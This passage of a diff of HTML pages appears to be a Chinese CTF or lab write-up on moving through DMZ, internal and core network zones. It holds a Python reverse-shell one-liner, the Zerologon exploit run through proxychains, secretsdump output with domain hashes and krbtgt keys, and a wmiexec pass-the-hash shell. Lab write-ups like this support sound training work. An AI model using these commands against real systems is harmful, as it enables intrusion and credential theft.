+</span></span><span class=line><span class=cl>python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;192.168.10.10&#34;,9090));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/bash&#34;,&#34;-i&#34;]);&#39;
+</span></span><span class=line><span class=cl>2、在交互式dmz区的shell上 监听nc -lnvp 9090
+</span></span><span class=line><span class=cl>3、用gitlab的exp 反弹shell到dmz的ip（192.168.10.10）
+</span></span></code></pre></div><p>获取了git的权限，flag在根目录</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>git@60783d084846:~/gitlab$ cat /flag.txt
+</span></span><span class=line><span class=cl>flag{b10785ca-a4ff-4cb9-a6d5-50351c248ee3}
+</span></span></code></pre></div><h3 id=内网区windows1921682015>内网区windows:192.168.20.15</h3><p>fscan开多了，所以没扫到其他资产，试了很久。然后把fscan进程一个个杀了，降低线程+重新跑了一下20+取消ping。
+发现了另外一个资产</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=mf>192.168.20.19</span><span class=p>:</span><span class=mi>22</span> <span class=nb>open</span>
+</span></span><span class=line><span class=cl><span class=mf>192.168.20.15</span><span class=p>:</span><span class=mi>135</span> <span class=nb>open</span>
+</span></span><span class=line><span class=cl><span class=mf>192.168.20.15</span><span class=p>:</span><span class=mi>139</span> <span class=nb>open</span>
+</span></span><span class=line><span class=cl><span class=mf>192.168.20.15</span><span class=p>:</span><span class=mi>445</span> <span class=nb>open</span>
+</span></span><span class=line><span class=cl><span class=mf>192.168.20.19</span><span class=p>:</span><span class=mi>8080</span> <span class=nb>open</span>
+</span></span><span class=line><span class=cl><span class=mf>192.168.20.15</span><span class=p>:</span><span class=mi>88</span> <span class=nb>open</span>
+</span></span><span class=line><span class=cl><span class=n>NetInfo</span><span class=p>:</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span><span class=mf>192.168.20.15</span>
+</span></span><span class=line><span class=cl>   <span class=p>[</span><span class=o>-&gt;</span><span class=p>]</span><span class=n>DC</span>
+</span></span><span class=line><span class=cl>   <span class=p>[</span><span class=o>-&gt;</span><span class=p>]</span><span class=mf>192.168.20.15</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=mf>192.168.20.15</span>  <span class=p>(</span><span class=n>Windows</span> <span class=n>Server</span> <span class=mi>2012</span> <span class=n>R2</span> <span class=n>Datacenter</span> <span class=mi>9600</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=mf>192.168.20.15</span>  <span class=p>[</span><span class=o>+</span><span class=p>]</span><span class=n>DC</span> <span class=n>COMPANY</span>\<span class=n>DC</span>                <span class=n>Windows</span> <span class=n>Server</span> <span class=mi>2012</span> <span class=n>R2</span> <span class=n>Datacenter</span> <span class=mi>9600</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>WebTitle</span><span class=p>:</span><span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=mf>192.168.20.19</span><span class=p>:</span><span class=mi>8080</span> <span class=n>code</span><span class=p>:</span><span class=mi>302</span> <span class=nb>len</span><span class=p>:</span><span class=mi>105</span>    <span class=n>title</span><span class=p>:</span><span class=kc>None</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>WebTitle</span><span class=p>:</span><span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=mf>192.168.20.19</span><span class=p>:</span><span class=mi>8080</span><span class=o>/</span><span class=n>users</span><span class=o>/</span><span class=n>sign_in</span> <span class=n>code</span><span class=p>:</span><span class=mi>200</span> <span class=nb>len</span><span class=p>:</span><span class=mi>17</span>     <span class=n>title</span><span class=p>:</span><span class=n>Sign</span> <span class=ow>in</span> <span class=err>·</span> <span class=n>GitLab</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>InfoScan</span><span class=p>:</span><span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=mf>192.168.20.19</span><span class=p>:</span><span class=mi>8080</span><span class=o>/</span><span class=n>users</span><span class=o>/</span><span class=n>sign_in</span> <span class=p>[</span><span class=n>GitLab</span><span class=p>]</span> 
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=mf>192.168.20.19</span><span class=p>:</span><span class=mi>8080</span> <span class=n>poc</span><span class=o>-</span><span class=n>yaml</span><span class=o>-</span><span class=n>gitlab</span><span class=o>-</span><span class=n>cnvd</span><span class=o>-</span><span class=mi>2021</span><span class=o>-</span><span class=mi>14193</span><span class=o>-</span><span class=n>infoleak</span>
 </span></span></code></pre></div><p>192.168.20.15是一台裸DC
 发现存在Zerologon经典漏洞，CVE-2020-1472
 先挂上192.168.10.10上的代理，github找一个exp,对着网站复现。
-拿到hash用kali的impacket组件，然后用wmiexec命令执行获取flag,所有过程如下</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">proxychains4</span> <span class="n">python3</span> <span class="n">cve</span><span class="o">-</span><span class="mi">2020</span><span class="o">-</span><span class="mi">1472</span><span class="o">-</span><span class="n">exploit</span><span class="o">.</span><span class="n">py</span> <span class="n">DC</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">20.15</span>                                 <span class="mi">1</span> <span class="err">⨯</span>
-</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">proxychains</span><span class="p">]</span> <span class="n">config</span> <span class="n">file</span> <span class="n">found</span><span class="p">:</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">proxychains4</span><span class="o">.</span><span class="n">conf</span>
-</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">proxychains</span><span class="p">]</span> <span class="n">preloading</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libproxychains</span><span class="o">.</span><span class="n">so</span><span class="o">.</span><span class="mi">4</span>
-</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">proxychains</span><span class="p">]</span> <span class="n">DLL</span> <span class="n">init</span><span class="p">:</span> <span class="n">proxychains</span><span class="o">-</span><span class="n">ng</span> <span class="mf">4.14</span>
-</span></span><span class="line"><span class="cl"><span class="n">Performing</span> <span class="n">authentication</span> <span class="n">attempts</span><span class="o">...</span>
-</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">proxychains</span><span class="p">]</span> <span class="n">Strict</span> <span class="n">chain</span>  <span class="o">...</span>  <span class="mf">172.30</span><span class="o">.</span><span class="mf">38.201</span><span class="p">:</span><span class="mi">8888</span>  <span class="o">...</span>  <span class="mf">192.168</span><span class="o">.</span><span class="mf">20.15</span><span class="p">:</span><span class="mi">135</span>  <span class="o">...</span>  <span class="n">OK</span>
-</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">proxychains</span><span class="p">]</span> <span class="n">Strict</span> <span class="n">chain</span>  <span class="o">...</span>  <span class="mf">172.30</span><span class="o">.</span><span class="mf">38.201</span><span class="p">:</span><span class="mi">8888</span>  <span class="o">...</span>  <span class="mf">192.168</span><span class="o">.</span><span class="mf">20.15</span><span class="p">:</span><span class="mi">49158</span>  <span class="o">...</span>  <span class="n">OK</span>
-</span></span><span class="line"><span class="cl"><span class="o">==================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================</span>
-</span></span><span class="line"><span class="cl"><span class="n">Target</span> <span class="n">vulnerable</span><span class="p">,</span> <span class="n">changing</span> <span class="n">account</span> <span class="n">password</span> <span class="n">to</span> <span class="n">empty</span> <span class="n">string</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">Result</span><span class="p">:</span> <span class="mi">0</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">Exploit</span> <span class="n">complete</span><span class="o">!</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="err">─</span><span class="o">$</span> <span class="n">proxychains4</span> <span class="n">python3</span> <span class="n">secretsdump</span><span class="o">.</span><span class="n">py</span>  <span class="o">-</span><span class="n">hashes</span> <span class="p">:</span><span class="mi">31</span><span class="n">d6cfe0d16ae931b73c59d7e0c089c0</span>  <span class="s2">&#34;company.local/DC\$@192.168.20.15&#34;</span>  <span class="mi">2</span> <span class="err">⨯</span>
-</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">proxychains</span><span class="p">]</span> <span class="n">config</span> <span class="n">file</span> <span class="n">found</span><span class="p">:</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">proxychains4</span><span class="o">.</span><span class="n">conf</span>
-</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">proxychains</span><span class="p">]</span> <span class="n">preloading</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libproxychains</span><span class="o">.</span><span class="n">so</span><span class="o">.</span><span class="mi">4</span>
-</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">proxychains</span><span class="p">]</span> <span class="n">DLL</span> <span class="n">init</span><span class="p">:</span> <span class="n">proxychains</span><span class="o">-</span><span class="n">ng</span> <span class="mf">4.14</span>
-</span></span><span class="line"><span class="cl"><span class="n">Impacket</span> <span class="n">v0</span><span class="o">.</span><span class="mf">10.1</span><span class="o">.</span><span class="n">dev1</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="mi">2022</span> <span class="n">Fortra</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">proxychains</span><span class="p">]</span> <span class="n">Strict</span> <span class="n">chain</span>  <span class="o">...</span>  <span class="mf">172.30</span><span class="o">.</span><span class="mf">38.201</span><span class="p">:</span><span class="mi">8888</span>  <span class="o">...</span>  <span class="mf">192.168</span><span class="o">.</span><span class="mf">20.15</span><span class="p">:</span><span class="mi">445</span>  <span class="o">...</span>  <span class="n">OK</span>
-</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">RemoteOperations</span> <span class="n">failed</span><span class="p">:</span> <span class="n">DCERPC</span> <span class="n">Runtime</span> <span class="n">Error</span><span class="p">:</span> <span class="n">code</span><span class="p">:</span> <span class="mh">0x5</span> <span class="o">-</span> <span class="n">rpc_s_access_denied</span> 
-</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Dumping</span> <span class="n">Domain</span> <span class="n">Credentials</span> <span class="p">(</span><span class="n">domain</span>\<span class="n">uid</span><span class="p">:</span><span class="n">rid</span><span class="p">:</span><span class="n">lmhash</span><span class="p">:</span><span class="n">nthash</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Using</span> <span class="n">the</span> <span class="n">DRSUAPI</span> <span class="n">method</span> <span class="n">to</span> <span class="n">get</span> <span class="n">NTDS</span><span class="o">.</span><span class="n">DIT</span> <span class="n">secrets</span>
-</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">proxychains</span><span class="p">]</span> <span class="n">Strict</span> <span class="n">chain</span>  <span class="o">...</span>  <span class="mf">172.30</span><span class="o">.</span><span class="mf">38.201</span><span class="p">:</span><span class="mi">8888</span>  <span class="o">...</span>  <span class="mf">192.168</span><span class="o">.</span><span class="mf">20.15</span><span class="p">:</span><span class="mi">135</span>  <span class="o">...</span>  <span class="n">OK</span>
-</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">proxychains</span><span class="p">]</span> <span class="n">Strict</span> <span class="n">chain</span>  <span class="o">...</span>  <span class="mf">172.30</span><span class="o">.</span><span class="mf">38.201</span><span class="p">:</span><span class="mi">8888</span>  <span class="o">...</span>  <span class="mf">192.168</span><span class="o">.</span><span class="mf">20.15</span><span class="p">:</span><span class="mi">49155</span>  <span class="o">...</span>  <span class="n">OK</span>
-</span></span><span class="line"><span class="cl"><span class="n">Administrator</span><span class="p">:</span><span class="mi">500</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="n">c1cd39bfd103a65a50fe6c7199dab799</span><span class="p">:::</span>
-</span></span><span class="line"><span class="cl"><span class="n">Guest</span><span class="p">:</span><span class="mi">501</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">31</span><span class="n">d6cfe0d16ae931b73c59d7e0c089c0</span><span class="p">:::</span>
-</span></span><span class="line"><span class="cl"><span class="n">krbtgt</span><span class="p">:</span><span class="mi">502</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mf">51103e514</span><span class="n">e91e837821f6c70b2fcbf3a</span><span class="p">:::</span>
-</span></span><span class="line"><span class="cl"><span class="n">DC</span><span class="o">$</span><span class="p">:</span><span class="mi">1001</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">31</span><span class="n">d6cfe0d16ae931b73c59d7e0c089c0</span><span class="p">:::</span>
-</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Kerberos</span> <span class="n">keys</span> <span class="n">grabbed</span>
-</span></span><span class="line"><span class="cl"><span class="n">krbtgt</span><span class="p">:</span><span class="n">aes256</span><span class="o">-</span><span class="n">cts</span><span class="o">-</span><span class="n">hmac</span><span class="o">-</span><span class="n">sha1</span><span class="o">-</span><span class="mi">96</span><span class="p">:</span><span class="mf">245e5824</span><span class="n">adfc248572451cb966eb44fea409149e70713f0b8400069732580b47</span>
-</span></span><span class="line"><span class="cl"><span class="n">krbtgt</span><span class="p">:</span><span class="n">aes128</span><span class="o">-</span><span class="n">cts</span><span class="o">-</span><span class="n">hmac</span><span class="o">-</span><span class="n">sha1</span><span class="o">-</span><span class="mi">96</span><span class="p">:</span><span class="mi">21</span><span class="n">fba0c76db699fb80c59730a1bb467c</span>
-</span></span><span class="line"><span class="cl"><span class="n">krbtgt</span><span class="p">:</span><span class="n">des</span><span class="o">-</span><span class="n">cbc</span><span class="o">-</span><span class="n">md5</span><span class="p">:</span><span class="n">dace764645ea2646</span>
-</span></span><span class="line"><span class="cl"><span class="n">DC</span><span class="o">$</span><span class="p">:</span><span class="n">aes256</span><span class="o">-</span><span class="n">cts</span><span class="o">-</span><span class="n">hmac</span><span class="o">-</span><span class="n">sha1</span><span class="o">-</span><span class="mi">96</span><span class="p">:</span><span class="mi">34</span><span class="n">c8b93f22c8c95d6c07a1a2bf35dcfae048091233406be6e16f89cdc1865db8</span>
-</span></span><span class="line"><span class="cl"><span class="n">DC</span><span class="o">$</span><span class="p">:</span><span class="n">aes128</span><span class="o">-</span><span class="n">cts</span><span class="o">-</span><span class="n">hmac</span><span class="o">-</span><span class="n">sha1</span><span class="o">-</span><span class="mi">96</span><span class="p">:</span><span class="mi">4</span><span class="n">c0c9af9f667ba964235c2d27b99e3c3</span>
-</span></span><span class="line"><span class="cl"><span class="n">DC</span><span class="o">$</span><span class="p">:</span><span class="n">des</span><span class="o">-</span><span class="n">cbc</span><span class="o">-</span><span class="n">md5</span><span class="p">:</span><span class="mi">43</span><span class="n">d519a4f22ca2a7</span>
-</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Cleaning</span> <span class="n">up</span><span class="o">...</span> 
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="err">└─</span><span class="o">$</span> <span class="n">proxychains4</span> <span class="n">python3</span> <span class="n">wmiexec</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">hashes</span> <span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="n">c1cd39bfd103a65a50fe6c7199dab799</span> <span class="n">company</span><span class="o">.</span><span class="n">local</span><span class="o">/</span><span class="n">Administrator</span><span class="err">@</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">20.15</span>
-</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">proxychains</span><span class="p">]</span> <span class="n">config</span> <span class="n">file</span> <span class="n">found</span><span class="p">:</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">proxychains4</span><span class="o">.</span><span class="n">conf</span>
-</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">proxychains</span><span class="p">]</span> <span class="n">preloading</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libproxychains</span><span class="o">.</span><span class="n">so</span><span class="o">.</span><span class="mi">4</span>
-</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">proxychains</span><span class="p">]</span> <span class="n">DLL</span> <span class="n">init</span><span class="p">:</span> <span class="n">proxychains</span><span class="o">-</span><span class="n">ng</span> <span class="mf">4.14</span>
-</span></span><span class="line"><span class="cl"><span class="n">Impacket</span> <span class="n">v0</span><span class="o">.</span><span class="mf">10.1</span><span class="o">.</span><span class="n">dev1</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="mi">2022</span> <span class="n">Fortra</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">proxychains</span><span class="p">]</span> <span class="n">Strict</span> <span class="n">chain</span>  <span class="o">...</span>  <span class="mf">172.30</span><span class="o">.</span><span class="mf">38.201</span><span class="p">:</span><span class="mi">8888</span>  <span class="o">...</span>  <span class="mf">192.168</span><span class="o">.</span><span class="mf">20.15</span><span class="p">:</span><span class="mi">445</span>  <span class="o">...</span>  <span class="n">OK</span>
-</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">SMBv3</span><span class="o">.</span><span class="mi">0</span> <span class="n">dialect</span> <span class="n">used</span>
-</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">proxychains</span><span class="p">]</span> <span class="n">Strict</span> <span class="n">chain</span>  <span class="o">...</span>  <span class="mf">172.30</span><span class="o">.</span><span class="mf">38.201</span><span class="p">:</span><span class="mi">8888</span>  <span class="o">...</span>  <span class="mf">192.168</span><span class="o">.</span><span class="mf">20.15</span><span class="p">:</span><span class="mi">135</span>  <span class="o">...</span>  <span class="n">OK</span>
-</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">proxychains</span><span class="p">]</span> <span class="n">Strict</span> <span class="n">chain</span>  <span class="o">...</span>  <span class="mf">172.30</span><span class="o">.</span><span class="mf">38.201</span><span class="p">:</span><span class="mi">8888</span>  <span class="o">...</span>  <span class="mf">192.168</span><span class="o">.</span><span class="mf">20.15</span><span class="p">:</span><span class="mi">49154</span>  <span class="o">...</span>  <span class="n">OK</span>
-</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">!</span><span class="p">]</span> <span class="n">Launching</span> <span class="n">semi</span><span class="o">-</span><span class="n">interactive</span> <span class="n">shell</span> <span class="o">-</span> <span class="n">Careful</span> <span class="n">what</span> <span class="n">you</span> <span class="n">execute</span>
-</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">!</span><span class="p">]</span> <span class="n">Press</span> <span class="n">help</span> <span class="k">for</span> <span class="n">extra</span> <span class="n">shell</span> <span class="n">commands</span>
-</span></span><span class="line"><span class="cl"><span class="n">C</span><span class="p">:</span>\<span class="o">&gt;</span><span class="n">type</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span>\<span class="n">Desktop</span>\<span class="n">flag</span><span class="o">.</span><span class="n">txt</span>
-</span></span><span class="line"><span class="cl"><span class="n">flag</span><span class="p">{</span><span class="n">bcbdb15f</span><span class="o">-</span><span class="n">fad8</span><span class="o">-</span><span class="mi">4</span><span class="n">f18</span><span class="o">-</span><span class="n">b9d5</span><span class="o">-</span><span class="n">c5ff397bf275</span><span class="p">}</span>
-</span></span></code></pre></div><h2 id="3核心内网区">3、核心内网区</h2>
-<p>总结前面的信息，在内网区的gitlab上跑fscan，获取扫描核心内网的资产</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">git@60783d084846:/tmp/fscan$ ./f -np -h 192.168.30.0/24 -o 30.txt
-</span></span><span class="line"><span class="cl">./f -np -h 192.168.30.0/24 -o 30.txt
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">   ___                              _    
-</span></span><span class="line"><span class="cl">  / _ \     ___  ___ _ __ __ _  ___| | __ 
-</span></span><span class="line"><span class="cl"> / /_\/____/ __|/ __| &#39;__/ _` |/ __| |/ /
-</span></span><span class="line"><span class="cl">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    
-</span></span><span class="line"><span class="cl">\____/     |___/\___|_|  \__,_|\___|_|\_\   
-</span></span><span class="line"><span class="cl">                     fscan version: 1.6.3
-</span></span><span class="line"><span class="cl">start infoscan
-</span></span><span class="line"><span class="cl">192.168.30.19:21 open
-</span></span><span class="line"><span class="cl">192.168.30.13:80 open
-</span></span><span class="line"><span class="cl">192.168.30.13:22 open
-</span></span><span class="line"><span class="cl">192.168.30.19:22 open
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">alive ports len is: 4
-</span></span><span class="line"><span class="cl">start vulscan
-</span></span><span class="line"><span class="cl">[*] WebTitle:http://192.168.30.13      code:200 len:7      title:Laravel
-</span></span><span class="line"><span class="cl">[+] InfoScan:http://192.168.30.13      [Laravel] 
-</span></span><span class="line"><span class="cl">已完成 1/4 [-] ssh 192.168.30.19:22 root root@2019 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain
-</span></span><span class="line"><span class="cl">已完成 3/4 [-] ftp://192.168.30.19:21 www Passw0rd 530 Login incorrect.
+拿到hash用kali的impacket组件，然后用wmiexec命令执行获取flag,所有过程如下</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>proxychains4</span> <span class=n>python3</span> <span class=n>cve</span><span class=o>-</span><span class=mi>2020</span><span class=o>-</span><span class=mi>1472</span><span class=o>-</span><span class=n>exploit</span><span class=o>.</span><span class=n>py</span> <span class=n>DC</span> <span class=mf>192.168</span><span class=o>.</span><span class=mf>20.15</span>                                 <span class=mi>1</span> <span class=err>⨯</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>proxychains</span><span class=p>]</span> <span class=n>config</span> <span class=n>file</span> <span class=n>found</span><span class=p>:</span> <span class=o>/</span><span class=n>etc</span><span class=o>/</span><span class=n>proxychains4</span><span class=o>.</span><span class=n>conf</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>proxychains</span><span class=p>]</span> <span class=n>preloading</span> <span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>x86_64</span><span class=o>-</span><span class=n>linux</span><span class=o>-</span><span class=n>gnu</span><span class=o>/</span><span class=n>libproxychains</span><span class=o>.</span><span class=n>so</span><span class=o>.</span><span class=mi>4</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>proxychains</span><span class=p>]</span> <span class=n>DLL</span> <span class=n>init</span><span class=p>:</span> <span class=n>proxychains</span><span class=o>-</span><span class=n>ng</span> <span class=mf>4.14</span>
+</span></span><span class=line><span class=cl><span class=n>Performing</span> <span class=n>authentication</span> <span class=n>attempts</span><span class=o>...</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>proxychains</span><span class=p>]</span> <span class=n>Strict</span> <span class=n>chain</span>  <span class=o>...</span>  <span class=mf>172.30</span><span class=o>.</span><span class=mf>38.201</span><span class=p>:</span><span class=mi>8888</span>  <span class=o>...</span>  <span class=mf>192.168</span><span class=o>.</span><span class=mf>20.15</span><span class=p>:</span><span class=mi>135</span>  <span class=o>...</span>  <span class=n>OK</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>proxychains</span><span class=p>]</span> <span class=n>Strict</span> <span class=n>chain</span>  <span class=o>...</span>  <span class=mf>172.30</span><span class=o>.</span><span class=mf>38.201</span><span class=p>:</span><span class=mi>8888</span>  <span class=o>...</span>  <span class=mf>192.168</span><span class=o>.</span><span class=mf>20.15</span><span class=p>:</span><span class=mi>49158</span>  <span class=o>...</span>  <span class=n>OK</span>
+</span></span><span class=line><span class=cl><span class=o>==================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================</span>
+</span></span><span class=line><span class=cl><span class=n>Target</span> <span class=n>vulnerable</span><span class=p>,</span> <span class=n>changing</span> <span class=n>account</span> <span class=n>password</span> <span class=n>to</span> <span class=n>empty</span> <span class=n>string</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>Result</span><span class=p>:</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>Exploit</span> <span class=n>complete</span><span class=o>!</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=err>─</span><span class=o>$</span> <span class=n>proxychains4</span> <span class=n>python3</span> <span class=n>secretsdump</span><span class=o>.</span><span class=n>py</span>  <span class=o>-</span><span class=n>hashes</span> <span class=p>:</span><span class=mi>31</span><span class=n>d6cfe0d16ae931b73c59d7e0c089c0</span>  <span class=s2>&#34;company.local/DC\$@192.168.20.15&#34;</span>  <span class=mi>2</span> <span class=err>⨯</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>proxychains</span><span class=p>]</span> <span class=n>config</span> <span class=n>file</span> <span class=n>found</span><span class=p>:</span> <span class=o>/</span><span class=n>etc</span><span class=o>/</span><span class=n>proxychains4</span><span class=o>.</span><span class=n>conf</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>proxychains</span><span class=p>]</span> <span class=n>preloading</span> <span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>x86_64</span><span class=o>-</span><span class=n>linux</span><span class=o>-</span><span class=n>gnu</span><span class=o>/</span><span class=n>libproxychains</span><span class=o>.</span><span class=n>so</span><span class=o>.</span><span class=mi>4</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>proxychains</span><span class=p>]</span> <span class=n>DLL</span> <span class=n>init</span><span class=p>:</span> <span class=n>proxychains</span><span class=o>-</span><span class=n>ng</span> <span class=mf>4.14</span>
+</span></span><span class=line><span class=cl><span class=n>Impacket</span> <span class=n>v0</span><span class=o>.</span><span class=mf>10.1</span><span class=o>.</span><span class=n>dev1</span> <span class=o>-</span> <span class=n>Copyright</span> <span class=mi>2022</span> <span class=n>Fortra</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>proxychains</span><span class=p>]</span> <span class=n>Strict</span> <span class=n>chain</span>  <span class=o>...</span>  <span class=mf>172.30</span><span class=o>.</span><span class=mf>38.201</span><span class=p>:</span><span class=mi>8888</span>  <span class=o>...</span>  <span class=mf>192.168</span><span class=o>.</span><span class=mf>20.15</span><span class=p>:</span><span class=mi>445</span>  <span class=o>...</span>  <span class=n>OK</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=n>RemoteOperations</span> <span class=n>failed</span><span class=p>:</span> <span class=n>DCERPC</span> <span class=n>Runtime</span> <span class=n>Error</span><span class=p>:</span> <span class=n>code</span><span class=p>:</span> <span class=mh>0x5</span> <span class=o>-</span> <span class=n>rpc_s_access_denied</span> 
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Dumping</span> <span class=n>Domain</span> <span class=n>Credentials</span> <span class=p>(</span><span class=n>domain</span>\<span class=n>uid</span><span class=p>:</span><span class=n>rid</span><span class=p>:</span><span class=n>lmhash</span><span class=p>:</span><span class=n>nthash</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Using</span> <span class=n>the</span> <span class=n>DRSUAPI</span> <span class=n>method</span> <span class=n>to</span> <span class=n>get</span> <span class=n>NTDS</span><span class=o>.</span><span class=n>DIT</span> <span class=n>secrets</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>proxychains</span><span class=p>]</span> <span class=n>Strict</span> <span class=n>chain</span>  <span class=o>...</span>  <span class=mf>172.30</span><span class=o>.</span><span class=mf>38.201</span><span class=p>:</span><span class=mi>8888</span>  <span class=o>...</span>  <span class=mf>192.168</span><span class=o>.</span><span class=mf>20.15</span><span class=p>:</span><span class=mi>135</span>  <span class=o>...</span>  <span class=n>OK</span>
